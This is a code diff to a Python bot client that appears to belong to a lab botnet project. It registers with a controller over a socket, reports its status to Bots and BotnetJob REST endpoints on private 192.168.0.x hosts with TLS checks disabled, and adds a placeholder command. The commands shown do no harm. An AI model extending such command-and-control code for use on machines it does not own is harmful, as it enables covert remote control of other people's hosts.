@@ -13,8 +13,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 class Client():
     def __init__(self):
         self.bot_registration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.bot_registration_address = ('192.168.0.114', 5582)
-        self.commands = {1: self.command1, 2: self.command2}
+
+        self.bot_registration_address = ('192.168.0.105', 5582)
+        self.commands = {1: self.command1, 2: self.command2, 3: self.command3}
         self.event_controller = threading.Event()
         self.botnet_id = 0
         self.bot_id = 0
@@ -73,14 +74,15 @@ class Client():
         if self.event_controller.is_set():
             self.event_controller.clear()
             self.botnet_job_id = 0
+            self.finish_command("Stopped")
 
     
     def command_wrapper(command):
         def command_controller(self, command_args):
-            url = "https://192.168.0.112:45456/api/v1/Bots/bot/" + str(self.bot_id)
+            url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
             bot_data = requests.get(url=url, verify=False).json()
             bot_data['status'] = "Working"
-            url = "https://192.168.0.112:45456/api/v1/Bots/" + str(self.bot_id)
+            url = "https://192.168.0.114:45456/api/v1/Bots/" + str(self.bot_id)
             headers = {'Content-type':'application/json', 'Accept':'application/json'}
             result = requests.put(url=url, verify=False, json=bot_data, headers=headers)
             print(result)
@@ -94,13 +96,13 @@ class Client():
 
     def finish_command(self, result):
         self.event_controller.clear()
-        url = "https://192.168.0.112:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
+        url = "https://192.168.0.114:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
         requests.delete(url=url, verify=False)
         self.botnet_job_id = 0
-        url = "https://192.168.0.112:45456/api/v1/Bots/bot/" + str(self.bot_id)
+        url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
         bot_data = requests.get(url=url, verify=False).json()
         bot_data['status'] = "Waiting"
-        url = "https://192.168.0.112:45456/api/v1/Bots/" + str(self.bot_id)
+        url = "https://192.168.0.114:45456/api/v1/Bots/" + str(self.bot_id)
         headers = {'Content-type':'application/json', 'Accept':'application/json'}
         requests.put(url=url, verify=False, json=bot_data, headers=headers)
 
@@ -134,6 +136,15 @@ class Client():
             print(f"Iteration {i}")
             time.sleep(1)
         print("Command finished")
+        return (True, result)
+
+    @command_wrapper
+    def command3(self, command_args):
+        print("Command 3 started")
+        print("Press a key to finish...")
+        input(">")
+        print("Command finished")
+        result = "Finished"
         return (True, result)
 
 
